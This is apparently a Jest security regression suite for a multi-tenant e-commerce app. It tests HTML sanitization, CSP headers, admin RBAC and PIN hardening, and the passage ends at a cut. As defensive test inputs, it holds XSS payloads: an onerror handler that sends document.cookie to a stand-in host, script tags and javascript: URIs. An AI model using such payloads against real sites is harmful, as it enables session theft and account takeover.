import fs from 'fs';
import path from 'path';
import { NextRequest } from 'next/server';
import {
  sanitizeSection10Html,
  validateCustomHtmlPayload,
  sanitizeNavigationUrl,
  MAX_CUSTOM_HTML_BYTES,
  STOREFRONT_CSP_HEADER,
} from '@/lib/security/html-sanitizer';
import { sanitizePublicTenantMetadata } from '@/lib/product-catalog';
import { checkTenantMutationPermission } from '@/lib/subscription-guard';
import { signMerchantSessionToken } from '@/lib/auth/merchant-session';
import { verifyManagerRole } from '@/lib/auth/rbac-guard';
import { getSupabaseAdmin, getSupabase } from '@/lib/supabaseClient';
import { StudioCreditService } from '@/lib/services/studio-credit.service';
import { middleware } from '@/middleware';

import {
  GET as getSettingsRoute,
  PUT as putSettingsRoute,
} from '@/app/api/v1/tenants/[slug]/settings/route';
import {
  GET as getThemeRoute,
  PUT as putThemeRoute,
} from '@/app/api/v1/tenants/[slug]/theme/route';
import {
  POST as postProductsRoute,
} from '@/app/api/v1/tenants/[slug]/products/route';
import {
  PATCH as patchProductByIdRoute,
} from '@/app/api/v1/tenants/[slug]/products/[id]/route';
import {
  GET as getPublicTenantRoute,
} from '@/app/api/v1/tenants/[slug]/route';
import {
  POST as postFulfillOrderRoute,
} from '@/app/api/v1/tenants/[slug]/orders/[id]/fulfill/route';
import {
  POST as postQuickPaidRoute,
} from '@/app/api/v1/tenants/[slug]/orders/[id]/quick-paid/route';
import {
  GET as getShippingConfigRoute,
  POST as postShippingConfigRoute,
} from '@/app/api/v1/shipping/config/route';
import {
  POST as postVerifyPinRoute,
} from '@/app/api/admin/studio/verify-pin/route';
import {
  GET as getAdminEntitlementsRoute,
  PATCH as patchAdminEntitlementsRoute,
} from '@/app/api/admin/tenants/[tenantId]/entitlements/route';
import {
  POST as postOfflineTransactionRoute,
} from '@/app/api/admin/transactions/offline/route';
import {
  GET as getAdminTenantConfigRoute,
  PATCH as patchAdminTenantConfigRoute,
} from '@/app/api/v1/admin/tenants/[slug]/config/route';
import {
  POST as postAdminGrantRoute,
} from '@/app/api/v1/admin/tenants/[slug]/grant/route';
import {
  PATCH as patchAdminStatusRoute,
} from '@/app/api/v1/admin/tenants/[slug]/status/route';
import {
  GET as getBroadcastAnnouncementRoute,
  POST as postBroadcastAnnouncementRoute,
} from '@/app/api/v1/admin/broadcast-announcement/route';
import {
  GET as getAiEconomicsRoute,
} from '@/app/api/v1/admin/ai-economics/route';
import {
  GET as getAdminSessionRoute,
} from '@/app/api/v1/admin/session/route';
import {
  GET as getAffiliateManagersRoute,
} from '@/app/api/v1/admin/affiliates/am/route';

jest.mock('@/lib/supabaseClient', () => {
  const actual = jest.requireActual('@/lib/supabaseClient');
  return {
    ...actual,
    getSupabaseAdmin: jest.fn(),
    getSupabase: jest.fn(),
  };
});

jest.mock('@/lib/auth/rbac-guard', () => ({
  verifyManagerRole: jest.fn(),
}));

jest.mock('next/cache', () => ({
  revalidatePath: jest.fn(),
}));

jest.mock('@/lib/services/studio-credit.service', () => ({
  StudioCreditService: {
    getEntitlements: jest.fn(),
    getLedgerHistory: jest.fn(),
    updateEntitlementsByAdmin: jest.fn(),
  },
}));

jest.mock('@/scripts/broadcast-tenant-announcement', () => ({
  fetchActiveTenantRecipients: jest.fn().mockResolvedValue([]),
  executeTenantAnnouncementBroadcast: jest.fn().mockResolvedValue({ sent: 0, dryRun: true }),
  buildFeatureAnnouncementHtml: jest.fn().mockReturnValue('<html><body>Preview</body></html>'),
}));

const TENANT_A_ID = '11111111-1111-4111-8111-111111111111';
const TENANT_B_ID = '22222222-2222-4222-8222-222222222222';
const ORDER_A_ID = '33333333-3333-4333-8333-333333333333';
const ORDER_B_ID = '44444444-4444-4444-8444-444444444444';
const ORDER_SUB_ID = '55555555-5555-4555-8555-555555555555';

const SESSION_SECRET = 'test-merchant-session-secret-bt-sec-2026-001-min32';
const INTERNAL_SECRET = 'test-internal-machine-secret-bt-sec-2026-001-min32';

interface MockState {
  tenants: any[];
  products: any[];
  orders: any[];
  tenantSettings: any[];
  affiliates: any[];
  auditLogs: any[];
  forceTenantsError: string | null;
}

function createMockSupabase(state: MockState) {
  function applyFilters(rows: any[], filters: Array<(r: any) => boolean>): any[] {
    return rows.filter((r) => filters.every((fn) => fn(r)));
  }

  function makeTableQuery(table: string) {
    const filters: Array<(r: any) => boolean> = [];
    let pendingUpdate: Record<string, any> | null = null;
    let pendingInsert: any = null;
    let pendingUpsert: any = null;
    let isDelete = false;

    const getCollection = (): any[] => {
      switch (table) {
        case 'tenants':
          return state.tenants;
        case 'products':
          return state.products;
        case 'orders':
          return state.orders;
        case 'tenant_settings':
          return state.tenantSettings;
        case 'affiliates':
          return state.affiliates;
        case 'tenant_config_audit_logs':
          return state.auditLogs;
        default:
          return [];
      }
    };

    const setCollection = (next: any[]) => {
      switch (table) {
        case 'tenants':
          state.tenants = next;
          break;
        case 'products':
          state.products = next;
          break;
        case 'orders':
          state.orders = next;
          break;
        case 'tenant_settings':
          state.tenantSettings = next;
          break;
        case 'affiliates':
          state.affiliates = next;
          break;
        case 'tenant_config_audit_logs':
          state.auditLogs = next;
          break;
      }
    };

    const execute = (mode: 'many' | 'maybeSingle' | 'single') => {
      if (table === 'tenants' && state.forceTenantsError) {
        return { data: null, error: { message: state.forceTenantsError } };
      }

      const collection = getCollection();

      if (pendingInsert !== null) {
        const items = Array.isArray(pendingInsert) ? pendingInsert : [pendingInsert];
        const inserted = items.map((item, idx) => ({
          id: item.id || `${table}-${Date.now()}-${idx}`,
          ...item,
        }));
        setCollection([...collection, ...inserted]);
        if (mode === 'many') return { data: inserted, error: null };
        return { data: inserted[0] || null, error: null };
      }

      if (pendingUpsert !== null) {
        const items = Array.isArray(pendingUpsert) ? pendingUpsert : [pendingUpsert];
        const results: any[] = [];
        const updatedCollection = [...collection];
        for (const item of items) {
          const matchIdx = updatedCollection.findIndex(
            (existing) =>
              (item.id && existing.id === item.id) ||
              (item.slug && existing.slug === item.slug) ||
              (item.tenant_slug && existing.tenant_slug === item.tenant_slug)
          );
          if (matchIdx >= 0) {
            updatedCollection[matchIdx] = { ...updatedCollection[matchIdx], ...item };
            results.push(updatedCollection[matchIdx]);
          } else {
            const newRow = { id: item.id || `${table}-${Date.now()}`, ...item };
            updatedCollection.push(newRow);
            results.push(newRow);
          }
        }
        setCollection(updatedCollection);
        if (mode === 'many') return { data: results, error: null };
        return { data: results[0] || null, error: null };
      }

      if (pendingUpdate !== null) {
        const updatedRows: any[] = [];
        const nextCollection = collection.map((row) => {
          if (filters.every((fn) => fn(row))) {
            const updated = { ...row, ...pendingUpdate };
            updatedRows.push(updated);
            return updated;
          }
          return row;
        });
        setCollection(nextCollection);
        if (mode === 'many') return { data: updatedRows, error: null };
        return { data: updatedRows[0] || null, error: null };
      }

      if (isDelete) {
        const kept: any[] = [];
        const removed: any[] = [];
        for (const row of collection) {
          if (filters.every((fn) => fn(row))) {
            removed.push(row);
          } else {
            kept.push(row);
          }
        }
        setCollection(kept);
        if (mode === 'many') return { data: removed, error: null };
        return { data: removed[0] || null, error: null };
      }

      const matched = applyFilters(collection, filters);
      if (mode === 'many') return { data: matched, error: null };
      return { data: matched[0] || null, error: null };
    };

    const builder: any = {
      select: () => builder,
      eq: (col: string, val: any) => {
        filters.push((row) => row?.[col] === val);
        return builder;
      },
      neq: (col: string, val: any) => {
        filters.push((row) => row?.[col] !== val);
        return builder;
      },
      gte: () => builder,
      order: () => builder,
      limit: () => builder,
      or: (expr: string) => {
        const clauses = expr.split(',').map((part) => part.trim()).filter(Boolean);
        filters.push((row) =>
          clauses.some((clause) => {
            const eqIdx = clause.indexOf('.eq.');
            if (eqIdx === -1) return false;
            const col = clause.slice(0, eqIdx).trim();
            const val = clause.slice(eqIdx + 4).trim();
            return String(row?.[col] ?? '') === val;
          })
        );
        return builder;
      },
      insert: (payload: any) => {
        pendingInsert = payload;
        return builder;
      },
      update: (payload: any) => {
        pendingUpdate = payload;
        return builder;
      },
      upsert: (payload: any) => {
        pendingUpsert = payload;
        return builder;
      },
      delete: () => {
        isDelete = true;
        return builder;
      },
      maybeSingle: () => Promise.resolve(execute('maybeSingle')),
      single: () => Promise.resolve(execute('single')),
      then: (resolve: (val: any) => any) => Promise.resolve(execute('many')).then(resolve),
    };

    return builder;
  }

  return {
    from: (table: string) => makeTableQuery(table),
    auth: {
      getUser: jest.fn().mockResolvedValue({ data: { user: null }, error: { message: 'Invalid token' } }),
    },
  };
}

function makeMerchantReq(
  url: string,
  options: {
    method?: string;
    body?: any;
    role?: 'OWNER' | 'MERCHANT' | 'CS' | 'OPERATOR';
    tenantSlug?: string;
    tenantId?: string;
    internalSecret?: string | null;
    bearerToken?: string | null;
    headers?: Record<string, string>;
  } = {}
) {
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    ...(options.headers || {}),
  };

  if (options.internalSecret) {
    headers['x-internal-secret'] = options.internalSecret;
  }

  if (options.bearerToken) {
    headers['authorization'] = `Bearer ${options.bearerToken}`;
  }

  if (options.role && options.tenantSlug) {
    const token = signMerchantSessionToken(
      {
        tenantSlug: options.tenantSlug,
        tenantId: options.tenantId,
        role: options.role,
        userId: `user-${options.role.toLowerCase()}`,
        name: `Test ${options.role}`,
      },
      SESSION_SECRET
    );
    headers['cookie'] = `bt_merchant_token=${token}`;
  }

  return new NextRequest(url, {
    method: options.method || 'GET',
    headers,
    body: options.body !== undefined ? JSON.stringify(options.body) : undefined,
  });
}

describe('BT-SEC-2026-001 Gate 1 Comprehensive Security & Regression Verification', () => {
  let state: MockState;
  const originalEnv = { ...process.env };
  const originalFetch = global.fetch;

  beforeAll(() => {
    process.env.BOONTRACK_SESSION_SECRET = SESSION_SECRET;
    process.env.MERCHANT_SESSION_SECRET = SESSION_SECRET;
    process.env.ADMIN_INTERNAL_SECRET = INTERNAL_SECRET;
    process.env.ADMIN_COOKIE_SECRET = SESSION_SECRET;
  });

  afterAll(() => {
    process.env = originalEnv;
    global.fetch = originalFetch;
  });

  beforeEach(() => {
    jest.clearAllMocks();
    state = {
      forceTenantsError: null,
      tenants: [
        {
          id: TENANT_A_ID,
          slug: 'toko-alpha',
          name: 'Toko Alpha',
          category: 'retail',
          tier: 'PRO_SCALE',
          status: 'active',
          is_active: true,
          phone: '628111111111',
          whatsapp_number: '628111111111',
          waba_access_token: 'EAAG-WABA-TOP-SECRET-TOKEN',
          waba_phone_number_id: '9876543210',
          metadata: {
            visual_theme: 'clean_minimal',
            bio: 'Toko resmi Alpha',
            capi_token: 'EAAG-CAPI-SECRET',
            tiktok_access_token: 'TT-SECRET-123',
            waba_config: {
              phone_number_id: '9876543210',
              access_token: 'EAAG-WABA-TOP-SECRET-TOKEN',
            },
            bank_accounts: [{ bank: 'BCA', account_number: '1234567890' }],
            payment_config: { qris_payload: '000201QRISSECRET', midtrans_server_key: 'SB-Mid-server-secret' },
            lincah_config: { api_key: 'LINCAH-PLAIN-SECRET-KEY-9999', origin_code: 'CGK' },
            shipping_config: {
              lincah: { api_key: 'LINCAH-PLAIN-SECRET-KEY-9999', origin_code: 'CGK' },
              courier: 'jne',
            },
            gateway_config: {
              provider: 'evolution',
              instance_name: 'alpha-wa',
              api_key: 'EVO-SECRET-KEY-123',
            },
            auto_replies: [{ id: 'ar-1', trigger: 'harga', reply: 'Mulai Rp50.000' }],
            theme: {
              primaryColor: '#10b981',
              mode: 'light',
              section_10: {
                enabled: true,
                custom_html: '<div><h2>Promo Alpha</h2></div>',
              },
            },
            products: [
              {
                id: 'prod-a1',
                name: 'Produk Alpha',
                price: 150000,
                is_active: true,
              },
            ],
          },
        },
        {
          id: TENANT_B_ID,
          slug: 'toko-beta',
          name: 'Toko Beta',
          category: 'retail',
          tier: 'SOLO',
          status: 'active',
          is_active: true,
          metadata: { products: [] },
        },
      ],
      products: [
        {
          id: 'prod-a1',
          tenant_id: TENANT_A_ID,
          name: 'Produk Alpha',
          slug: 'produk-alpha',
          price: 150000,
          is_active: true,
          fulfillment_metadata: {},
        },
      ],
      orders: [
        {
          id: ORDER_A_ID,
          tenant_id: TENANT_A_ID,
          tenant_slug: 'toko-alpha',
          order_number: 'ORD-ALPHA-001',
          invoice_no: 'INV-ALPHA-001',
          status: 'PAID',
          shipping_status: 'PENDING_PICKUP',
          tracking_number: null,
        },
        {
          id: ORDER_B_ID,
          tenant_id: TENANT_B_ID,
          tenant_slug: 'toko-beta',
          order_number: 'ORD-BETA-999',
          invoice_no: 'INV-BETA-999',
          status: 'PAID',
          shipping_status: 'PENDING_PICKUP',
          tracking_number: null,
        },
        {
          id: ORDER_SUB_ID,
          tenant_id: TENANT_A_ID,
          tenant_slug: 'toko-alpha',
          order_number: 'ORD-SUB-001',
          status: 'PENDING',
          payment_status: 'PENDING',
          is_subscription: true,
          product_type: 'SUBSCRIPTION',
        },
      ],
      tenantSettings: [
        {
          tenant_slug: 'toko-alpha',
          biteship_config: {
            is_enabled: true,
            lincah: {
              api_key: 'LINCAH-PLAIN-SECRET-KEY-9999',
              api_key_read_only: 'LINCAH-RO-SECRET-8888',
              origin_code: 'CGK',
            },
          },
        },
      ],
      affiliates: [
        { id: 'am-1', name: 'Manager 1', role: 'am', status: 'ACTIVE', referral_code: 'AM01' },
      ],
      auditLogs: [],
    };

    const mockSb = createMockSupabase(state);
    (getSupabaseAdmin as jest.Mock).mockReturnValue(mockSb);
    (getSupabase as jest.Mock).mockReturnValue(mockSb);

    (verifyManagerRole as jest.Mock).mockImplementation(async (req: NextRequest) => {
      const authHeader = req.headers.get('authorization') || '';
      if (authHeader === 'Bearer superadmin-jwt') {
        return {
          authorized: true,
          role: 'SUPERADMIN',
          userId: 'sa-uuid-1',
        };
      }
      if (authHeader === 'Bearer affiliate-jwt') {
        return {
          authorized: true,
          role: 'AFFILIATE_MANAGER',
          userId: 'am-uuid-1',
        };
      }
      return {
        authorized: false,
        errorStatus: 401,
        errorMessage: 'Unauthorized',
      };
    });

    (StudioCreditService.getEntitlements as jest.Mock).mockResolvedValue({
      tenant_id: TENANT_A_ID,
      tier: 'PRO_SCALE',
      credits_remaining: 100,
    });
    (StudioCreditService.getLedgerHistory as jest.Mock).mockResolvedValue([]);
    (StudioCreditService.updateEntitlementsByAdmin as jest.Mock).mockResolvedValue({
      success: true,
      entitlement: { tenant_id: TENANT_A_ID, tier: 'TEAM_SCALE', credits_remaining: 500 },
    });

    // Ensure Core Backend proxy calls fail fast cleanly unless explicitly mocked
    global.fetch = jest.fn().mockRejectedValue(new Error('Offline in unit test')) as any;
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SUITE 1: SEC-XSS-01..06 & Q-SEC-01 Option B
  // ═══════════════════════════════════════════════════════════════════════════
  describe('Suite 1 — SEC-XSS-01..06 & Q-SEC-01 Option B (Sanitization, Size Cap, CSP, Role Gate)', () => {
    it('SEC-XSS-01: strips <script>, event handlers, <iframe>, <svg>, <form> while keeping safe markup', () => {
      const dirty = `
        <section class="hero">
          <h1 onclick="alert(1)">Promo Resmi</h1>
          <img src="https://assets.boontrack.com/banner.png" onerror="fetch('https://evil.test/?c='+document.cookie)" />
          <script>window.__pwned = true;</script>
          <iframe src="https://evil.test"></iframe>
          <svg onload="alert(2)"></svg>
          <form action="https://evil.test"><input type="text" /></form>
          <a href="https://wa.me/628123456789" target="_blank">Chat WA</a>
        </section>
      `;

      const clean = sanitizeSection10Html(dirty);
      expect(clean).toContain('<section');
      expect(clean).toContain('Promo Resmi');
      expect(clean).toContain('https://assets.boontrack.com/banner.png');
      expect(clean).toContain('https://wa.me/628123456789');

      expect(clean.toLowerCase()).not.toContain('<script');
      expect(clean.toLowerCase()).not.toContain('__pwned');
      expect(clean.toLowerCase()).not.toContain('onerror');
      expect(clean.toLowerCase()).not.toContain('onclick');
      expect(clean.toLowerCase()).not.toContain('<iframe');
      expect(clean.toLowerCase()).not.toContain('<svg');
      expect(clean.toLowerCase()).not.toContain('<form');
    });

    it('SEC-XSS-02: blocks javascript:, vbscript:, and data: URIs across links and navigation URLs', () => {
      expect(sanitizeNavigationUrl('javascript:alert(1)')).toBeNull();
      expect(sanitizeNavigationUrl('JaVaScRiPt:alert(document.cookie)')).toBeNull();
      expect(sanitizeNavigationUrl('vbscript:msgbox(1)')).toBeNull();
      expect(sanitizeNavigationUrl('data:text/html,<script>alert(1)</script>')).toBeNull();

      expect(sanitizeNavigationUrl('https://boontrack.com/promo')).toBe('https://boontrack.com/promo');
      expect(sanitizeNavigationUrl('mailto:cs@boontrack.com')).toBe('mailto:cs@boontrack.com');
      expect(sanitizeNavigationUrl('/toko-alpha/p/produk')).toBe('/toko-alpha/p/produk');

      const dirtyLinks = '<a href="javascript:alert(1)">Click</a><a href="https://boontrack.com">Safe</a>';
      const cleaned = sanitizeSection10Html(dirtyLinks);
      expect(cleaned.toLowerCase()).not.toContain('javascript:');
      expect(cleaned).toContain('https://boontrack.com');
    });

    it('SEC-XSS-03: enforces 65,536-byte max payload cap on validator, theme API, and product APIs (413)', async () => {
      const oversizedHtml = `<div>${'A'.repeat(MAX_CUSTOM_HTML_BYTES + 128)}</div>`;
      const check = validateCustomHtmlPayload(oversizedHtml);
      expect(check.valid).toBe(false);
      if (!check.valid) {
        expect(check.status).toBe(413);
      }

      // Theme API (as SuperAdmin to reach payload validation after Q-SEC-01 check)
      const themeReq = makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/theme', {
        method: 'PUT',
        bearerToken: 'superadmin-jwt',
        body: {
          theme: {
            section_10: {
              enabled: true,
              custom_html: oversizedHtml,
            },
          },
        },
      });
      const themeRes = await putThemeRoute(themeReq, { params: Promise.resolve({ slug: 'toko-alpha' }) });
      expect(themeRes.status).toBe(413);

      // Products POST API
      const prodReq = makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/products', {
        method: 'POST',
        role: 'OWNER',
        tenantSlug: 'toko-alpha',
        tenantId: TENANT_A_ID,
        body: {
          name: 'Produk Besar',
          price: 100000,
          single_page_config: {
            enabled: true,
            custom_html: oversizedHtml,
          },
        },
      });
      const prodRes = await postProductsRoute(prodReq, { params: Promise.resolve({ slug: 'toko-alpha' }) });
      expect(prodRes.status).toBe(413);

      // Products PATCH by ID API
      const prodIdReq = makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/products/prod-a1', {
        method: 'PATCH',
        role: 'OWNER',
        tenantSlug: 'toko-alpha',
        tenantId: TENANT_A_ID,
        body: {
          custom_html: oversizedHtml,
        },
      });
      const prodIdRes = await patchProductByIdRoute(prodIdReq, {
        params: Promise.resolve({ slug: 'toko-alpha', id: 'prod-a1' }),
      });
      expect(prodIdRes.status).toBe(413);
    });

    it('SEC-XSS-04: removes runtime <script> re-hydration from Section10CustomHtml & p/[slug] and removes Section 10 editor from ThemeTab', () => {
      const section10Src = fs.readFileSync(
        path.resolve(process.cwd(), 'app/[tenant]/components/Section10CustomHtml.tsx'),
        'utf8'
      );
      const productLandingSrc = fs.readFileSync(
        path.resolve(process.cwd(), 'app/[tenant]/p/[slug]/page.tsx'),
        'utf8'
      );
      const themeTabSrc = fs.readFileSync(
        path.resolve(process.cwd(), 'app/[tenant]/dashboard/components/tabs/ThemeTab.tsx'),
        'utf8'
      );

      expect(section10Src).toContain('sanitizeSection10Html');
      expect(section10Src).not.toContain("createElement('script')");
      expect(section10Src).not.toContain('createElement("script")');
      expect(section10Src).not.toContain('replaceChild');

      expect(productLandingSrc).toContain('sanitizeSection10Html');
      expect(productLandingSrc).not.toContain("createElement('script')");
      expect(productLandingSrc).not.toContain('createElement("script")');

      expect(themeTabSrc).not.toContain('handleSaveSection10');
      expect(themeTabSrc).not.toContain('section10Html');
      expect(themeTabSrc).not.toContain('section_10');
    });

    it('SEC-XSS-05: middleware attaches restrictive Content-Security-Policy on storefront pages', async () => {
      global.fetch = jest.fn().mockResolvedValue({
        ok: true,
        status: 200,
        json: async () => [
          {
            id: TENANT_A_ID,
            slug: 'toko-alpha',
            tier: 'PRO_SCALE',
            status: 'active',
            is_active: true,
            metadata: {},
          },
        ],
      }) as any;

      const resLocalHome = await middleware(new NextRequest('http://localhost:3000/toko-alpha'));
      expect(resLocalHome.headers.get('content-security-policy')).toBe(STOREFRONT_CSP_HEADER);

      const resVanityHome = await middleware(
        new NextRequest('https://boontrack.com/toko-alpha', {
          headers: { host: 'boontrack.com' },
        })
      );
      expect(resVanityHome.headers.get('content-security-policy')).toBe(STOREFRONT_CSP_HEADER);

      const resProd = await middleware(
        new NextRequest('https://boontrack.com/toko-alpha/p/produk-alpha', {
          headers: { host: 'boontrack.com' },
        })
      );
      expect(resProd.headers.get('content-security-policy')).toBe(STOREFRONT_CSP_HEADER);

      const resShop = await middleware(
        new NextRequest('https://shop.boontrack.com/toko-alpha', {
          headers: { host: 'shop.boontrack.com' },
        })
      );
      expect(resShop.headers.get('content-security-policy')).toBe(STOREFRONT_CSP_HEADER);

      const resSubdomain = await middleware(
        new NextRequest('https://toko-alpha.boontrack.com/', {
          headers: { host: 'toko-alpha.boontrack.com' },
        })
      );
      expect(resSubdomain.headers.get('content-security-policy')).toBe(STOREFRONT_CSP_HEADER);
    });

    it('SEC-XSS-06 (Q-SEC-01 Option B): blocks regular MERCHANT/OWNER from writing section_10 (403) while allowing verified SUPERADMIN & INTERNAL_SERVICE with sanitization', async () => {
      // Merchant denied on /theme
      const merchantThemeReq = makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/theme', {
        method: 'PUT',
        role: 'OWNER',
        tenantSlug: 'toko-alpha',
        tenantId: TENANT_A_ID,
        body: {
          theme: {
            section_10: {
              enabled: true,
              custom_html: '<div>Inject</div><script>alert(1)</script>',
            },
          },
        },
      });
      const merchantThemeRes = await putThemeRoute(merchantThemeReq, {
        params: Promise.resolve({ slug: 'toko-alpha' }),
      });
      const merchantThemeJson = await merchantThemeRes.json();
      expect(merchantThemeRes.status).toBe(403);
      expect(merchantThemeJson.error).toBe('SECTION_10_FORBIDDEN');
      expect(state.auditLogs.some((l) => l.status === 'BLOCKED' && l.action === 'SECTION_10_WRITE')).toBe(true);

      // Merchant denied on /settings
      const merchantSettingsReq = makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/settings', {
        method: 'PUT',
        role: 'MERCHANT',
        tenantSlug: 'toko-alpha',
        tenantId: TENANT_A_ID,
        body: {
          section_10: { custom_html: '<p>Hack</p>' },
        },
      });
      const merchantSettingsRes = await putSettingsRoute(merchantSettingsReq, {
        params: Promise.resolve({ slug: 'toko-alpha' }),
      });
      const merchantSettingsJson = await merchantSettingsRes.json();
      expect(merchantSettingsRes.status).toBe(403);
      expect(merchantSettingsJson.error).toBe('SECTION_10_FORBIDDEN');

      // SuperAdmin allowed on /theme and HTML is sanitized
      const saReq = makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/theme', {
        method: 'PUT',
        bearerToken: 'superadmin-jwt',
        body: {
          theme: {
            section_10: {
              enabled: true,
              custom_html: '<div><h2>Approved Section</h2><script>evil()</script><a href="javascript:alert(1)">Bad</a></div>',
            },
          },
        },
      });
      const saRes = await putThemeRoute(saReq, { params: Promise.resolve({ slug: 'toko-alpha' }) });
      const saJson = await saRes.json();
      expect(saRes.status).toBe(200);
      expect(saJson.section_10.custom_html).toContain('Approved Section');
      expect(saJson.section_10.custom_html.toLowerCase()).not.toContain('<script');
      expect(saJson.section_10.custom_html.toLowerCase()).not.toContain('javascript:');

      // Internal Machine Auth allowed on /theme
      const machineReq = makeMerchantReq('http://localhost:3000/api/v1/tenants/toko-alpha/theme', {
        method: 'PUT',
        internalSecret: INTERNAL_SECRET,
        body: {
          theme: {
            section_10: {
              enabled: true,
              custom_html: '<section><p>PS Automated Setup</p><img src="https://x.test/a.png" onerror="alert(1)" /></section>',
            },
          },
        },
      });
      const machineRes = await putThemeRoute(machineReq, { params: Promise.resolve({ slug: 'toko-alpha' }) });
      const machineJson = await machineRes.json();
      expect(machineRes.status).toBe(200);
      expect(machineJson.section_10.custom_html).toContain('PS Automated Setup');
      expect(machineJson.section_10.custom_html.toLowerCase()).not.toContain('onerror');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SUITE 2: ITEM A — Admin Control Plane & Studio PIN Hardening
  // ═══════════════════════════════════════════════════════════════════════════
  describe('Suite 2 — Item A: Admin API RBAC, Studio PIN Hardening & UI Backdoor Elimination', () => {
    it('eliminates hardcoded 998877 & client localStorage super_admin_auth across all app/admin UI files', () => {
      const adminRoot = path.resolve(process.cwd(), 'app/admin');
      const walk = (dir: string): string[] => {
        const out: string[] = [];
        for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
          const full = path.join(dir, entry.name);
          if (entry.isDirectory()) out.push(...walk(full));
          else if (/\.(ts|tsx|js|jsx)$/.test(entry.name)) out.push(full);
        }
        return out;
      };
      const files = walk(adminRoot);
      expect(files.length).toBeGreaterThan(0);
      for (const file of files) {
        const src = fs.readFileSync(file, 'utf8');
        expect(src).not.toContain('998877');
        expect(src).not.toContain('super_admin_auth');
        expect(src).not.toContain('x-admin-pin');
      }
    });

    it('rejects 998877 PIN on /api/admin/studio/verify-pin (401), fails closed 503 if ADMIN_STUDIO_PIN unset, and issues httpOnly cookie with strong env PIN or SUPERADMIN JWT', async () => {
      delete process.env.ADMIN_STUDIO_PIN;

      // Reject legacy 998877
      const legacyRes = await postVerifyPinRoute(
        new NextRequest('http://localhost:3000/api/admin/studio/verify-pin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pin: '998877' }),
        })
      );
      expect(legacyRes.status).toBe(401);

      // Fail closed when unconfigured
      const uncfgRes = await postVerifyPinRoute(
        new NextRequest('http://localhost:3000/api/admin/studio/verify-pin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pin: 'StrongStudioPin2026!' }),
        })
      );
      expect(uncfgRes.status).toBe(503);

      // Configured >= 8-char PIN succeeds + sets httpOnly cookie
      process.env.ADMIN_STUDIO_PIN = 'StrongStudioPin2026!';
      const validPinRes = await postVerifyPinRoute(
        new NextRequest('http://localhost:3000/api/admin/studio/verify-pin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pin: 'StrongStudioPin2026!' }),
        })
      );
      expect(validPinRes.status).toBe(200);
      expect(validPinRes.headers.get('set-cookie')).toContain('studio_admin_verified=');
      expect(validPinRes.headers.get('set-cookie')?.toLowerCase()).toContain('httponly');

      // SUPERADMIN JWT also succeeds
      const saPinRes = await postVerifyPinRoute(
        new NextRequest('http://localhost:3000/api/admin/studio/verify-pin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', authorization: 'Bearer superadmin-jwt' },
          body: JSON.stringify({}),
        })
      );
      expect(saPinRes.status).toBe(200);
    });

    it('rejects unauthenticated (401) and AFFILIATE_MANAGER (403) across ALL SuperAdmin endpoints', async () => {
      const checkCases: Array<{
        name: string;
        call: (token?: string) => Promise<Response>;
      }> = [
        {
          name: 'GET /api/v1/admin/session',
          call: (t) =>
            getAdminSessionRoute(
              new NextRequest('http://localhost:3000/api/v1/admin/session', {
                headers: t ? { authorization: `Bearer ${t}` } : {},
              })
            ),
        },
        {
          name: 'GET /api/admin/tenants/[tenantId]/entitlements',
          call: (t) =>
            getAdminEntitlementsRoute(
              new NextRequest('http://localhost:3000/api/admin/tenants/toko-alpha/entitlements', {
                headers: t ? { authorization: `Bearer ${t}` } : {},
              }),
              { params: Promise.resolve({ tenantId: 'toko-alpha' }) }
            ),
        },
        {
          name: 'PATCH /api/admin/tenants/[tenantId]/entitlements',
          call: (t) =>
            patchAdminEntitlementsRoute(
              new NextRequest('http://localhost:3000/api/admin/tenants/toko-alpha/entitlements', {
                method: 'PATCH',
                headers: {
                  'Content-Type': 'application/json',
                  ...(t ? { authorization: `Bearer ${t}` } : {}),
                },
                body: JSON.stringify({ tier: 'TEAM_SCALE' }),
              }),
              { params: Promise.resolve({ tenantId: 'toko-alpha' }) }
            ),
        },
        {
          name: 'POST /api/admin/transactions/offline',
          call: (t) =>
            postOfflineTransactionRoute(
              new NextRequest('http://localhost:3000/api/admin/transactions/offline', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                  ...(t ? { authorization: `Bearer ${t}` } : {}),
                },
                body: JSON.stringify({ tenant_id: 'toko-alpha', amount_idr: 500000 }),
              })
            ),
        },
        {
          name: 'GET /api/v1/admin/tenants/[slug]/config',
          call: (t) =>
            getAdminTenantConfigRoute(
              new NextRequest('http://localhost:3000/api/v1/admin/tenants/toko-alpha/config', {
                headers: t ? { authorization: `Bearer ${t}` } : {},
              }),
              { params: Promise.resolve({ slug: 'toko-alpha' }) }
            ),
        },
        {
          name: 'PATCH /api/v1/admin/tenants/[slug]/config',
          call: (t) =>
            patchAdminTenantConfigRoute(
              new NextRequest('http://localhost:3000/api/v1/admin/tenants/toko-alpha/config', {
                method: 'PATCH',
                headers: {
                  'Content-Type': 'application/json',
                  ...(t ? { authorization: `Bearer ${t}` } : {}),
                },
                body: JSON.stringify({ metadata: { bio: 'Admin override' } }),
              }),
              { params: Promise.resolve({ slug: 'toko-alpha' }) }
            ),
        },
        {
          name: 'POST /api/v1/admin/tenants/[slug]/grant',
          call: (t) =>
            postAdminGrantRoute(
              new NextRequest('http://localhost:3000/api/v1/admin/tenants/toko-alpha/grant', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                  ...(t ? { authorization: `Bearer ${t}` } : {}),
                },
                body: JSON.stringify({ tier: 'PRO_SCALE', months: 1 }),
              }),
              { params: Promise.resolve({ slug: 'toko-alpha' }) }
            ),
        },
        {
          name: 'PATCH /api/v1/admin/tenants/[slug]/status',
          call: (t) =>
            patchAdminStatusRoute(
